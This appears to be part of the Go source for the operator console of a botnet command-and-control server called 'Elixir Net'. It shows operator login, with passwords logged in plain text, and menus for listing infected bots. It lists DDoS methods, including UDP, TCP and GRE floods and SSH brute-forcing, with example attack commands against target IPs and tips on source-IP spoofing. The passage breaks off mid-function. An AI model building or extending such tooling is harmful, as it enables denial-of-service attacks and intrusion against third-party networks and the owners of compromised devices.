package main
import (
	"encoding/binary"
	"fmt"
	"log"
	"net"
	"os"
	"strconv"
	"strings"
	"time"
)
type Admin struct {
	conn         net.Conn
	cmdHistory   []string
	historyPos   int
	suggestions  []string
}
func NewAdmin(conn net.Conn) *Admin {
	return &Admin{
		conn:       conn,
		cmdHistory: make([]string, 0, 100),
		historyPos: 0,
			suggestions: []string{
				"help", "methods", "power", "count", "bots", "botlist", "botinfo", "stats", "history", "stop", "clear", "cls", "c",
				"logout", "exit", "quit", "adminhelp", "adminuser", "adminadmin",
				"adminremove", "adminlogs", "selfupdate", "multivector", "mv", "geo", "map", "visualize",
				"intelligence", "intel", "exploits", "p2p", "mesh",
			"udphex", "slowudp", "socket", "zconnect", "tcp_full", "tcp_connect",
			"orbitv3pps", "orbitv4", "ssh_bruteforce", "tcpipi", "greip", "greeth",
			"tcpsyn", "randhex", "tcpack", "tcpstomp", "udpgeneric", "udpvse",
			"udpdns", "ice", "tcpall", "tcpfrag", "asyn", "autobypass",
		},
	}
}
func (this *Admin) Handle() {
	this.conn.Write([]byte("\033[?1049h"))
	this.conn.Write([]byte("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22"))
	defer func() {
		this.conn.Write([]byte("\033[?1049l"))
	}()
	this.conn.Write([]byte(fmt.Sprintf("\033]0;Please enter your credentials.\007")))
	this.conn.SetDeadline(time.Now().Add(300 * time.Second))
	this.conn.Write([]byte("\033[2J\033[1H"))
	this.conn.Write([]byte("\033[1;33mUsername \033[1;37m> \033[0m"))
	username, err := this.ReadLine(false)
	if err != nil {
		return
	}
	this.conn.SetDeadline(time.Now().Add(300 * time.Second))
	this.conn.Write([]byte("\r\n"))
	this.conn.Write([]byte("\033[1;33mPassword \033[1;37m> \033[0m"))
	password, err := this.ReadLine(true)
	if err != nil {
		return
	}
	this.conn.SetDeadline(time.Now().Add(300 * time.Second))
	this.conn.Write([]byte("\r\n"))
	spinBuf := []byte{'V', 'e', 'r', 'i', 'f', 'y', '.', '.', '.'}
	for i := 0; i < 15; i++ {
		this.conn.Write([]byte(fmt.Sprintf("\033]0;Waiting...\007")))
		this.conn.Write(append([]byte("\r\x1b[0;36m💫 \x1b[1;30m"), spinBuf[i%len(spinBuf)]))
		time.Sleep(time.Duration(10) * time.Millisecond)
	}
	this.conn.Write([]byte("\r\n"))
	var loggedIn bool
	var userInfo AccountInfo
	if database == nil {
		this.conn.Write([]byte("\r\x1b[0;31mDatabase connection error. Please try again later.\r\n"))
		buf := make([]byte, 1)
		this.conn.Read(buf)
		return
	}
	if loggedIn, userInfo = database.TryLogin(username, password); !loggedIn {
		this.conn.Write([]byte("\r\x1b[0;34mWrong credentials, try again.\r\n"))
		buf := make([]byte, 1)
		this.conn.Read(buf)
		return
	}
	if userInfo.username == "" {
		this.conn.Write([]byte("\r\x1b[0;31mAuthentication error. Please try again.\r\n"))
		buf := make([]byte, 1)
		this.conn.Read(buf)
		return
	}
	if len(username) > 0 && len(password) > 0 {
		log.SetFlags(log.LstdFlags)
		os.MkdirAll("logs", 0755)
		loginLogsOutput, err := os.OpenFile("logs/logins.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0665)
		if err != nil {
			fmt.Printf("Failed to open log file: %v\n", err)
		} else {
			defer loginLogsOutput.Close()
			logEntry := fmt.Sprintf(
				"| SUCCESSFUL LOGIN | username:%s | password:%s | ip:%s |",
				username,
				password,
				this.conn.RemoteAddr().String(),
			)
			log.SetOutput(loginLogsOutput)
			log.Println(logEntry)
		}
	}
	banner := "\033[2J\033[1H" +
		"\r\n" +
		"\x1b[1;35m                    ░░░░░░░░░\x1b[1;36m▒▒▒▒▒▒\x1b[1;34m▓▓▓\x1b[1;36m▒▒▒▒▒▒\x1b[1;35m░░░░░░░░░\r\n" +
		"\x1b[1;35m                 ░░░░░\x1b[1;36m▒▒▒▒▒▒▒\x1b[1;34m▓▓▓▓▓▓▓▓▓\x1b[1;36m▒▒▒▒▒▒▒\x1b[1;35m░░░░░\r\n" +
		"\x1b[1;35m               ░░░\x1b[1;36m▒▒▒▒▒\x1b[1;34m▓▓▓▓\x1b[1;37m███\x1b[38;5;51m████\x1b[1;37m███\x1b[1;34m▓▓▓▓\x1b[1;36m▒▒▒▒▒\x1b[1;35m░░░\r\n" +
		"\x1b[1;35m             ░░\x1b[1;36m▒▒▒▒\x1b[1;34m▓▓▓▓\x1b[1;37m██\x1b[38;5;51m████████████\x1b[1;37m██\x1b[1;34m▓▓▓▓\x1b[1;36m▒▒▒▒\x1b[1;35m░░\r\n" +
		"\x1b[1;35m            ░\x1b[1;36m▒▒▒\x1b[1;34m▓▓▓\x1b[1;37m███\x1b[38;5;51m████\x1b[1;95m╔═══════════╗\x1b[38;5;51m████\x1b[1;37m███\x1b[1;34m▓▓▓\x1b[1;36m▒▒▒\x1b[1;35m░\r\n" +
		"\x1b[1;35m           ░\x1b[1;36m▒▒\x1b[1;34m▓▓▓\x1b[1;37m██\x1b[38;5;51m████\x1b[1;95m╔╝\x1b[1;97m ELIXIR NET \x1b[1;95m╚╗\x1b[38;5;51m████\x1b[1;37m██\x1b[1;34m▓▓▓\x1b[1;36m▒▒\x1b[1;35m░\r\n" +
		"\x1b[1;35m          ░\x1b[1;36m▒\x1b[1;34m▓▓▓\x1b[1;37m██\x1b[38;5;51m█████\x1b[1;95m║\x1b[38;5;198m  BOTNET   \x1b[1;95m║\x1b[38;5;51m█████\x1b[1;37m██\x1b[1;34m▓▓▓\x1b[1;36m▒\x1b[1;35m░\r\n" +
		"\x1b[1;35m          \x1b[1;36m▒\x1b[1;34m▓▓\x1b[1;37m███\x1b[38;5;51m██████\x1b[1;95m╚╗\x1b[38;5;201m c0re+why \x1b[1;95m╔╝\x1b[38;5;51m██████\x1b[1;37m███\x1b[1;34m▓▓\x1b[1;36m▒\r\n" +
		"\x1b[1;35m          \x1b[1;36m▒\x1b[1;34m▓▓\x1b[1;37m███\x1b[38;5;51m███████\x1b[1;95m╚═══════╝\x1b[38;5;51m███████\x1b[1;37m███\x1b[1;34m▓▓\x1b[1;36m▒\r\n" +
		"\x1b[1;35m          \x1b[1;36m▒\x1b[1;34m▓▓\x1b[1;37m██\x1b[38;5;51m████████████████████████\x1b[1;37m██\x1b[1;34m▓▓\x1b[1;36m▒\r\n" +
		"\x1b[1;35m          ░\x1b[1;36m▒\x1b[1;34m▓▓\x1b[1;37m███\x1b[38;5;51m██████████████████████\x1b[1;37m███\x1b[1;34m▓▓\x1b[1;36m▒\x1b[1;35m░\r\n" +
		"\x1b[1;35m           ░\x1b[1;36m▒▒\x1b[1;34m▓▓\x1b[1;37m██\x1b[38;5;51m████████████████████\x1b[1;37m██\x1b[1;34m▓▓\x1b[1;36m▒▒\x1b[1;35m░\r\n" +
		"\x1b[1;35m            ░\x1b[1;36m▒▒\x1b[1;34m▓▓▓\x1b[1;37m███\x1b[38;5;51m████████████████\x1b[1;37m███\x1b[1;34m▓▓▓\x1b[1;36m▒▒\x1b[1;35m░\r\n" +
		"\x1b[1;35m             ░░\x1b[1;36m▒▒▒\x1b[1;34m▓▓▓▓\x1b[1;37m██\x1b[38;5;51m████████████\x1b[1;37m██\x1b[1;34m▓▓▓▓\x1b[1;36m▒▒▒\x1b[1;35m░░\r\n" +
		"\x1b[1;35m               ░░\x1b[1;36m▒▒▒▒\x1b[1;34m▓▓▓▓\x1b[1;37m███\x1b[38;5;51m████\x1b[1;37m███\x1b[1;34m▓▓▓▓\x1b[1;36m▒▒▒▒\x1b[1;35m░░\r\n" +
		"\x1b[1;35m                 ░░░\x1b[1;36m▒▒▒▒▒\x1b[1;34m▓▓▓▓▓▓▓▓▓\x1b[1;36m▒▒▒▒▒\x1b[1;35m░░░\r\n" +
		"\x1b[1;35m                    ░░░░\x1b[1;36m▒▒▒▒▒\x1b[1;34m▓▓▓\x1b[1;36m▒▒▒▒▒\x1b[1;35m░░░░\r\n" +
		"\r\n" +
		"\x1b[38;5;240m              ╔════════════════════════════════╗\r\n" +
		"\x1b[38;5;240m              ║ \x1b[38;5;201m✨ powered by orbital tech ✨  \x1b[38;5;240m║\r\n" +
		"\x1b[38;5;240m              ╚════════════════════════════════╝\x1b[0m\r\n\r\n"
	this.conn.Write([]byte(banner))
	this.conn.Write([]byte("\x1b[1;90m╔═══════════════════════════════════════════════════════════╗\r\n"))
	this.conn.Write([]byte("\x1b[1;90m║ \x1b[1;36mHotkeys: \x1b[1;33m↑↓\x1b[0;90m history \x1b[1;33m←→\x1b[0;90m move \x1b[1;33mTab\x1b[0;90m complete \x1b[1;33mCtrl+L\x1b[0;90m clear   \x1b[1;90m║\r\n"))
	this.conn.Write([]byte("\x1b[1;90m║ \x1b[1;33mCtrl+U\x1b[0;90m line \x1b[1;33mCtrl+W\x1b[0;90m word \x1b[1;33mHome/End\x1b[0;90m jump \x1b[1;33mDel\x1b[0;90m delete \x1b[1;90m║\r\n"))
	this.conn.Write([]byte("\x1b[1;90m╚═══════════════════════════════════════════════════════════╝\x1b[0m\r\n\r\n"))
	go func() {
		i := 0
		for {
			var BotCount int
			if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
				BotCount = userInfo.maxBots
			} else {
				BotCount = clientList.Count()
			}
			time.Sleep(time.Second)
			if userInfo.admin == 1 {
				if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0;Elixir Net ✨ :: %d bots :: %d users :: %d running atk :: %d sents\007", BotCount, database.fetchRunningAttacks(), database.fetchAttacks(), database.fetchUsers()))); err != nil {
					return
				}
			} else {
				if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0;Elixir Net :: %d bots :: %d running atk\007", BotCount, database.fetchRunningAttacks()))); err != nil {
					return
				}
			}
			i++
			if i%60 == 0 {
				this.conn.SetDeadline(time.Now().Add(120 * time.Second))
			}
		}
	}()
	for {
		var botCatagory string
		var botCount int
		this.conn.Write([]byte("\x1b[1;35;48;5;236m ☾ \x1b[1;38;5;201;48;5;236m" + username + "\x1b[1;38;5;51;48;5;236m 󰓇\x1b[1;95;48;5;236m Elixir \x1b[1;38;5;198m\x1b[38;5;201m➤\x1b[1;201m➤ \x1b[0m"))
		cmd, err := this.ReadLine(false)
		if err != nil || cmd == "exit" || cmd == "quit" {
			return
		}
		if cmd == "" {
			continue
		}
		if err != nil || cmd == "cls" || cmd == "clear" || cmd == "c" {
			this.conn.Write([]byte("\033[2J\033[1H\r\n"))
			this.conn.Write([]byte(
				"\x1b[1;35m                    ░░░░░░░░░\x1b[1;36m▒▒▒▒▒▒\x1b[1;34m▓▓▓\x1b[1;36m▒▒▒▒▒▒\x1b[1;35m░░░░░░░░░\r\n" +
				"\x1b[1;35m                 ░░░░░\x1b[1;36m▒▒▒▒▒▒▒\x1b[1;34m▓▓▓▓▓▓▓▓▓\x1b[1;36m▒▒▒▒▒▒▒\x1b[1;35m░░░░░\r\n" +
				"\x1b[1;35m               ░░░\x1b[1;36m▒▒▒▒▒\x1b[1;34m▓▓▓▓\x1b[1;37m███\x1b[38;5;51m████\x1b[1;37m███\x1b[1;34m▓▓▓▓\x1b[1;36m▒▒▒▒▒\x1b[1;35m░░░\r\n" +
				"\x1b[1;35m             ░░\x1b[1;36m▒▒▒▒\x1b[1;34m▓▓▓▓\x1b[1;37m██\x1b[38;5;51m████████████\x1b[1;37m██\x1b[1;34m▓▓▓▓\x1b[1;36m▒▒▒▒\x1b[1;35m░░\r\n" +
				"\x1b[1;35m            ░\x1b[1;36m▒▒▒\x1b[1;34m▓▓▓\x1b[1;37m███\x1b[38;5;51m████\x1b[1;95m╔═══════════╗\x1b[38;5;51m████\x1b[1;37m███\x1b[1;34m▓▓▓\x1b[1;36m▒▒▒\x1b[1;35m░\r\n" +
				"\x1b[1;35m           ░\x1b[1;36m▒▒\x1b[1;34m▓▓▓\x1b[1;37m██\x1b[38;5;51m████\x1b[1;95m╔╝\x1b[1;97m ELIXIR NET \x1b[1;95m╚╗\x1b[38;5;51m████\x1b[1;37m██\x1b[1;34m▓▓▓\x1b[1;36m▒▒\x1b[1;35m░\r\n" +
				"\x1b[1;35m          ░\x1b[1;36m▒\x1b[1;34m▓▓▓\x1b[1;37m██\x1b[38;5;51m█████\x1b[1;95m║\x1b[38;5;198m  BOTNET   \x1b[1;95m║\x1b[38;5;51m█████\x1b[1;37m██\x1b[1;34m▓▓▓\x1b[1;36m▒\x1b[1;35m░\r\n" +
				"\x1b[1;35m          \x1b[1;36m▒\x1b[1;34m▓▓\x1b[1;37m███\x1b[38;5;51m██████\x1b[1;95m╚╗\x1b[38;5;201m c0re+why \x1b[1;95m╔╝\x1b[38;5;51m██████\x1b[1;37m███\x1b[1;34m▓▓\x1b[1;36m▒\r\n" +
				"\x1b[1;35m          \x1b[1;36m▒\x1b[1;34m▓▓\x1b[1;37m███\x1b[38;5;51m███████\x1b[1;95m╚═══════╝\x1b[38;5;51m███████\x1b[1;37m███\x1b[1;34m▓▓\x1b[1;36m▒\r\n" +
				"\x1b[1;35m          \x1b[1;36m▒\x1b[1;34m▓▓\x1b[1;37m██\x1b[38;5;51m████████████████████████\x1b[1;37m██\x1b[1;34m▓▓\x1b[1;36m▒\r\n" +
				"\x1b[1;35m          ░\x1b[1;36m▒\x1b[1;34m▓▓\x1b[1;37m███\x1b[38;5;51m██████████████████████\x1b[1;37m███\x1b[1;34m▓▓\x1b[1;36m▒\x1b[1;35m░\r\n" +
				"\x1b[1;35m           ░\x1b[1;36m▒▒\x1b[1;34m▓▓\x1b[1;37m██\x1b[38;5;51m████████████████████\x1b[1;37m██\x1b[1;34m▓▓\x1b[1;36m▒▒\x1b[1;35m░\r\n" +
				"\x1b[1;35m            ░\x1b[1;36m▒▒\x1b[1;34m▓▓▓\x1b[1;37m███\x1b[38;5;51m████████████████\x1b[1;37m███\x1b[1;34m▓▓▓\x1b[1;36m▒▒\x1b[1;35m░\r\n" +
				"\x1b[1;35m             ░░\x1b[1;36m▒▒▒\x1b[1;34m▓▓▓▓\x1b[1;37m██\x1b[38;5;51m████████████\x1b[1;37m██\x1b[1;34m▓▓▓▓\x1b[1;36m▒▒▒\x1b[1;35m░░\r\n" +
				"\x1b[1;35m               ░░\x1b[1;36m▒▒▒▒\x1b[1;34m▓▓▓▓\x1b[1;37m███\x1b[38;5;51m████\x1b[1;37m███\x1b[1;34m▓▓▓▓\x1b[1;36m▒▒▒▒\x1b[1;35m░░\r\n" +
				"\x1b[1;35m                 ░░░\x1b[1;36m▒▒▒▒▒\x1b[1;34m▓▓▓▓▓▓▓▓▓\x1b[1;36m▒▒▒▒▒\x1b[1;35m░░░\r\n" +
				"\x1b[1;35m                    ░░░░\x1b[1;36m▒▒▒▒▒\x1b[1;34m▓▓▓\x1b[1;36m▒▒▒▒▒\x1b[1;35m░░░░\r\n" +
				"\r\n" +
				"\x1b[38;5;240m              ╔════════════════════════════════╗\r\n" +
				"\x1b[38;5;240m              ║ \x1b[38;5;201m✨ powered by orbital tech ✨  \x1b[38;5;240m║\r\n" +
				"\x1b[38;5;240m              ╚════════════════════════════════╝\x1b[0m\r\n\r\n"))
			statsPanel := fmt.Sprintf("\r\x1b[1;37m╔%s╗\r\n"+
				"\x1b[1;37m║ \x1b[38;5;51m  Online Users: \x1b[1;36m%-6d \x1b[38;5;198m│ \x1b[38;5;51m  Bots: \x1b[1;36m%-6d \x1b[1;37m║\r\n"+
				"\x1b[1;37m║ \x1b[38;5;51m  Active Attacks: \x1b[1;31m%-6d \x1b[38;5;198m│ \x1b[38;5;51m  Total Attacks: \x1b[1;31m%-6d \x1b[1;37m║\r\n"+
				"\x1b[1;37m╚%s╝\r\n\r\n",
				strings.Repeat("═", 47),
				database.fetchUsers(),
				clientList.Count(),
				database.fetchRunningAttacks(),
				database.fetchAttacks(),
				strings.Repeat("═", 47))
			this.conn.Write([]byte(statsPanel))
			this.conn.Write([]byte("\r\x1b[1;38;5;198m» \x1b[1;38;5;201mWELCOME TO THE \x1b[1;38;5;51mELIXIR NETWORK \x1b[38;5;198m«\x1b[0m\r\n"))
			this.conn.Write([]byte("\r\x1b[38;5;111m  Type 'help' to see available commands \x1b[38;5;198m☾☾☾\x1b[0m\r\n\r\n"))
			continue
		}
		if cmd == "methods" || cmd == "power" {
			this.conn.Write([]byte("\033[2J\033[1H"))
			if cmd == "power" {
				this.conn.Write([]byte("┌──────────────────────────────────────────────────────────────┐\r\n"))
				this.conn.Write([]byte("│        elixir net - max power recommendations                │\r\n"))
				this.conn.Write([]byte("├──────────────────────────────────────────────────────────────┤\r\n"))
				type recEntry struct {
					name string
					rec  string
				}
				var recs []recEntry
				for name, rec := range powerRecommendations {
					recs = append(recs, recEntry{name: name, rec: rec})
				}
				for _, r := range recs {
					this.conn.Write([]byte(fmt.Sprintf("│ \x1b[1;35m%-15s\x1b[0m \x1b[1;33m%s\x1b[0m\r\n", r.name, r.rec)))
				}
				this.conn.Write([]byte("├──────────────────────────────────────────────────────────────┤\r\n"))
				this.conn.Write([]byte("│ \x1b[1;36mNotes:\x1b[0m                                                        │\r\n"))
				this.conn.Write([]byte("│ • Higher threads = more CPU usage but more PPS               │\r\n"))
				this.conn.Write([]byte("│ • Larger packets = more bandwidth usage                      │\r\n"))
				this.conn.Write([]byte("│ • source=255.255.255.255 = random source IP spoofing         │\r\n"))
				this.conn.Write([]byte("│ • ttl=64 recommended for most attacks                        │\r\n"))
				this.conn.Write([]byte("└──────────────────────────────────────────────────────────────┘\r\n"))
				continue
			}
			globalStats.Update()
			this.conn.Write([]byte("┌──────────────────────────────────────────────────────────────┐\r\n"))
			this.conn.Write([]byte("│        elixir net - attack methods  (made by c0re)           │\r\n"))
			this.conn.Write([]byte("├──────────────────────────────────────────────────────────────┤\r\n"))
			type methodEntry struct {
				name        string
				id          uint8
				description string
			}
			var methods []methodEntry
			for cmdName, atkInfo := range attackInfoLookup {
				methods = append(methods, methodEntry{
					name:        cmdName,
					id:          atkInfo.attackID,
					description: atkInfo.attackDescription,
				})
			}
			for i := 0; i < len(methods)-1; i++ {
				for j := i + 1; j < len(methods); j++ {
					if methods[i].id > methods[j].id {
						methods[i], methods[j] = methods[j], methods[i]
					}
				}
			}
			for _, m := range methods {
				line := fmt.Sprintf("│ \x1b[1;35m%-15s\x1b[0m - %s", m.name, m.description)
				ms := globalStats.GetMethodStats(m.id)
				if ms != nil && (ms.TotalPPS > 0 || ms.TotalBPS > 0) {
					statsStr := fmt.Sprintf(" [PPS: %s]", formatPPS(ms.AvgPPS))
					if len(line)+len(statsStr) <= 62 {
						line += statsStr
					}
				}
				if len(line) > 62 {
					line = line[:59] + "..."
				}
				this.conn.Write([]byte(line + "\r\n"))
			}
			this.conn.Write([]byte("├──────────────────────────────────────────────────────────────┤\r\n"))
			this.conn.Write([]byte("│ \x1b[1;36mUsage examples:\x1b[0m                                              │\r\n"))
			this.conn.Write([]byte("│ nudp 1.2.3.4 120 port=666                                    │\r\n"))
			this.conn.Write([]byte("│ slowudp 1.2.3.4 300 port=80 threads=64 size=256              │\r\n"))
			this.conn.Write([]byte("│ socket 1.2.3.4 120 port=80 threads=64 conns=1000 size=1024   │\r\n"))
			this.conn.Write([]byte("│ tcp_full 1.2.3.4 300 port=80 threads=128                     │\r\n"))
			this.conn.Write([]byte("│ orbitv3pps 1.2.3.4 240 port=443 threads=128 size=32          │\r\n"))
			this.conn.Write([]byte("│ ssh_bruteforce 194.161.56.0/24 dict=common.txt               │\r\n"))
			this.conn.Write([]byte("│ \x1b[1;33mUse 'power' command for max power recommendations\x1b[0m            │\r\n"))
			this.conn.Write([]byte("│ Use '?' after method name for flag help                      │\r\n"))
			this.conn.Write([]byte("└──────────────────────────────────────────────────────────────┘\r\n"))
			continue
		}
		if cmd == "geo" || cmd == "map" || cmd == "visualize" {
			this.handleGeoMenu()
			continue
		}
		if cmd == "intelligence" || cmd == "intel" {
			this.handleIntelligenceMenu()
			continue
		}
		if cmd == "exploits" {
			this.handleExploitsMenu()
			continue
		}
		if cmd == "p2p" || cmd == "mesh" {
			this.handleP2PMenu()
			continue
		}
		if cmd == "help" {
			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte("\x1b[1;95m╔══════════════════════════════════════════════════════════════╗\r\n"))
			this.conn.Write([]byte("\x1b[1;95m║\x1b[1;97m              SPOOFED NETWORK - HELP MENU                   \x1b[1;95m║\r\n"))
			this.conn.Write([]byte("\x1b[1;95m╠══════════════════════════════════════════════════════════════╣\r\n"))
			this.conn.Write([]byte("\x1b[1;95m║ \x1b[1;36mBase Commands:\x1b[0m                                             \x1b[1;95m║\r\n"))
			this.conn.Write([]byte("\x1b[1;95m║ \x1b[1;33mhelp\x1b[0m         - show this help menu                        \x1b[1;95m║\r\n"))
			this.conn.Write([]byte("\x1b[1;95m║ \x1b[1;33mmethods\x1b[0m      - list all attack methods                   \x1b[1;95m║\r\n"))
			this.conn.Write([]byte("\x1b[1;95m║ \x1b[1;33mpower\x1b[0m        - max power recommendations for methods      \x1b[1;95m║\r\n"))
			this.conn.Write([]byte("\x1b[1;95m║ \x1b[1;33mcount\x1b[0m        - show bot count by architecture           \x1b[1;95m║\r\n"))
			this.conn.Write([]byte("\x1b[1;95m║ \x1b[1;33mbots\x1b[0m         - list connected bots                       \x1b[1;95m║\r\n"))
			this.conn.Write([]byte("\x1b[1;95m║ \x1b[1;33mbotlist\x1b[0m      - detailed bot list with IPs                \x1b[1;95m║\r\n"))
			this.conn.Write([]byte("\x1b[1;95m║ \x1b[1;33mbotinfo\x1b[0m      - bot information and statistics            \x1b[1;95m║\r\n"))
			this.conn.Write([]byte("\x1b[1;95m║ \x1b[1;33mstats\x1b[0m        - network statistics                         \x1b[1;95m║\r\n"))
			this.conn.Write([]byte("\x1b[1;95m║ \x1b[1;33mmultivector\x1b[0m  - launch multiple methods simultaneously        \x1b[1;95m║\r\n"))
			this.conn.Write([]byte("\x1b[1;95m║ \x1b[1;33mgeo/map\x1b[0m      - geolocation visualization and world map      \x1b[1;95m║\r\n"))
			this.conn.Write([]byte("\x1b[1;95m║ \x1b[1;33mhistory\x1b[0m      - show attack history                       \x1b[1;95m║\r\n"))
			this.conn.Write([]byte("\x1b[1;95m║ \x1b[1;33mintelligence\x1b[0m - view intelligence reports from bots          \x1b[1;95m║\r\n"))
			this.conn.Write([]byte("\x1b[1;95m║ \x1b[1;33mexploits\x1b[0m     - view discovered exploits database            \x1b[1;95m║\r\n"))
			this.conn.Write([]byte("\x1b[1;95m║ \x1b[1;33mp2p/mesh\x1b[0m    - view P2P mesh network peers                 \x1b[1;95m║\r\n"))
			this.conn.Write([]byte("\x1b[1;95m║ \x1b[1;33mstop\x1b[0m         - stop all attacks                           \x1b[1;95m║\r\n"))
			this.conn.Write([]byte("\x1b[1;95m║ \x1b[1;33mclear/cls/c\x1b[0m  - clear screen                               \x1b[1;95m║\r\n"))
			this.conn.Write([]byte("\x1b[1;95m║ \x1b[1;33madminhelp\x1b[0m    - admin commands (admins only)               \x1b[1;95m║\r\n"))
			this.conn.Write([]byte("\x1b[1;95m║ \x1b[1;33mlogout/exit\x1b[0m  - disconnect from session                    \x1b[1;95m║\r\n"))
			this.conn.Write([]byte("\x1b[1;95m╠══════════════════════════════════════════════════════════════╣\r\n"))
			this.conn.Write([]byte("\x1b[1;95m║ \x1b[1;36mKeyboard Shortcuts:\x1b[0m                                        \x1b[1;95m║\r\n"))
			this.conn.Write([]byte("\x1b[1;95m║ \x1b[1;33m↑/↓ arrows\x1b[0m   - navigate command history                  \x1b[1;95m║\r\n"))
			this.conn.Write([]byte("\x1b[1;95m║ \x1b[1;33m←/→ arrows\x1b[0m   - move cursor left/right                    \x1b[1;95m║\r\n"))
			this.conn.Write([]byte("\x1b[1;95m║ \x1b[1;33mTab\x1b[0m          - autocomplete command                       \x1b[1;95m║\r\n"))
			this.conn.Write([]byte("\x1b[1;95m║ \x1b[1;33mHome/End\x1b[0m     - jump to start/end of line                  \x1b[1;95m║\r\n"))
			this.conn.Write([]byte("\x1b[1;95m║ \x1b[1;33mDelete\x1b[0m       - delete character at cursor                  \x1b[1;95m║\r\n"))
			this.conn.Write([]byte("\x1b[1;95m║ \x1b[1;33mBackspace\x1b[0m    - delete character before cursor              \x1b[1;95m║\r\n"))
			this.conn.Write([]byte("\x1b[1;95m║ \x1b[1;33mCtrl+L\x1b[0m       - clear screen                                \x1b[1;95m║\r\n"))
			this.conn.Write([]byte("\x1b[1;95m║ \x1b[1;33mCtrl+U\x1b[0m       - clear entire line                           \x1b[1;95m║\r\n"))
			this.conn.Write([]byte("\x1b[1;95m║ \x1b[1;33mCtrl+W\x1b[0m       - delete word before cursor                   \x1b[1;95m║\r\n"))
			this.conn.Write([]byte("\x1b[1;95m║ \x1b[1;33mCtrl+C\x1b[0m       - cancel current input                        \x1b[1;95m║\r\n"))
			this.conn.Write([]byte("\x1b[1;95m╠══════════════════════════════════════════════════════════════╣\r\n"))
			this.conn.Write([]byte("\x1b[1;95m║ \x1b[1;36mAttack Syntax:\x1b[0m                                             \x1b[1;95m║\r\n"))
			this.conn.Write([]byte("\x1b[1;95m║ \x1b[1;32m<method> <target> <duration> [flags]\x1b[0m                     \x1b[1;95m║\r\n"))
			this.conn.Write([]byte("\x1b[1;95m║ \x1b[0;90mExample: udphex 1.2.3.4 120 port=80\x1b[0m                    \x1b[1;95m║\r\n"))
			this.conn.Write([]byte("\x1b[1;95m║ \x1b[0;90mUse -<number> to limit bots: -100 udphex 1.2.3.4 120\x1b[0m  \x1b[1;95m║\r\n"))
			this.conn.Write([]byte("\x1b[1;95m╚══════════════════════════════════════════════════════════════╝\r\n"))
			continue
		}
		if err != nil || cmd == "logout" || cmd == "LOGOUT" {
			return
		}
		if cmd == "count" {
			this.conn.Write([]byte("\033[2J\033[1H\r\n"))
			this.conn.Write([]byte("\x1b[1;95m╔══════════════════════════════════════════════╗\r\n"))
			this.conn.Write([]byte("\x1b[1;95m║\x1b[1;97m    ELIXIR NET - BOT DISTRIBUTION        \x1b[1;95m║\r\n"))
			this.conn.Write([]byte("\x1b[1;95m╠══════════════════════════════════════════════╣\r\n"))
			botCount := clientList.Count()
			distribution := clientList.Distribution()
			if botCount == 0 {
				this.conn.Write([]byte("\x1b[1;95m║ \x1b[1;31m☾ No bots connected\x1b[0m                   \x1b[1;95m║\r\n"))
			} else {
				for arch, count := range distribution {
					archName := arch
					if len(archName) > 10 {
						archName = archName[:10]
					}
					percentage := float64(count) / float64(botCount) * 100
					barLen := int(percentage / 2.5)
					if barLen > 15 {
						barLen = 15
					}
					bar := strings.Repeat("█", barLen) + strings.Repeat("░", 15-barLen)
					this.conn.Write([]byte(fmt.Sprintf(
						"\x1b[1;95m║ \x1b[38;5;51m%-10s \x1b[1;36m%4d \x1b[38;5;201m%s \x1b[1;33m%5.1f%% \x1b[1;95m║\r\n",
						archName, count, bar, percentage)))
				}
			}
			this.conn.Write([]byte("\x1b[1;95m╠══════════════════════════════════════════════╣\r\n"))
			this.conn.Write([]byte(fmt.Sprintf(
				"\x1b[1;95m║ \x1b[1;97m☾ Total Bots: \x1b[38;5;201m%-6d\x1b[0m                   \x1b[1;95m║\r\n", 
				botCount)))
			this.conn.Write([]byte("\x1b[1;95m╚══════════════════════════════════════════════╝\r\n"))
			continue
		}
		if cmd == "bots" {
			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte("┌──────────────────────────────────────────────────────────────┐\r\n"))
			this.conn.Write([]byte("│                    CONNECTED BOTS LIST                     │\r\n"))
			this.conn.Write([]byte("├──────────────────────────────────────────────────────────────┤\r\n"))
			botCount := clientList.Count()
			distribution := clientList.Distribution()
			if botCount == 0 {
				this.conn.Write([]byte("│ No bots connected                                              │\r\n"))
			} else {
				for arch, count := range distribution {
					this.conn.Write([]byte(fmt.Sprintf("│ %-20s: %-10d bots                    │\r\n", arch, count)))
				}
			}
			this.conn.Write([]byte(fmt.Sprintf("├──────────────────────────────────────────────────────────────┤\r\n")))
			this.conn.Write([]byte(fmt.Sprintf("│ Total: %-10d bots connected                        │\r\n", botCount)))
			this.conn.Write([]byte("└──────────────────────────────────────────────────────────────┘\r\n"))
			continue
		}
		if cmd == "botlist" {
			this.conn.Write([]byte("\033[2J\033[1H\r\n"))
			this.conn.Write([]byte("\x1b[1;95m╔══════════════════════════════════════════════════════════════╗\r\n"))
			this.conn.Write([]byte("\x1b[1;95m║\x1b[1;97m              ELIXIR NET - DETAILED BOT LIST              \x1b[1;95m║\r\n"))
			this.conn.Write([]byte("\x1b[1;95m╠══════════════════════════════════════════════════════════════╣\r\n"))
			this.conn.Write([]byte("\x1b[1;95m║ \x1b[38;5;51mIP Address\x1b[0m          │ \x1b[38;5;201mArchitecture\x1b[0m │ \x1b[1;36mUptime\x1b[0m        │ \x1b[1;33mVersion\x1b[0m      \x1b[1;95m║\r\n"))
			this.conn.Write([]byte("\x1b[1;95m╠══════════════════════════════════════════════════════════════╣\r\n"))
			bots := clientList.GetBots()
			if len(bots) == 0 {
				this.conn.Write([]byte("\x1b[1;95m║ \x1b[1;31m☾ No bots connected\x1b[0m                                      \x1b[1;95m║\r\n"))
			} else {
				for i, bot := range bots {
					if i >= 50 {
						this.conn.Write([]byte(fmt.Sprintf(
							"\x1b[1;95m║ \x1b[1;33m... and %d more bots\x1b[0m                                \x1b[1;95m║\r\n",
							len(bots)-50)))
						break
					}
					uptime := bot.GetUptime()
					uptimeStr := fmt.Sprintf("%dh %dm", int(uptime.Hours()), int(uptime.Minutes())%60)
					ip := bot.GetIP()
					if len(ip) > 19 {
						ip = ip[:19]
					}
					arch := bot.source
					if arch == "" {
						arch = "unknown"
					}
					if len(arch) > 12 {
						arch = arch[:12]
					}
					this.conn.Write([]byte(fmt.Sprintf(
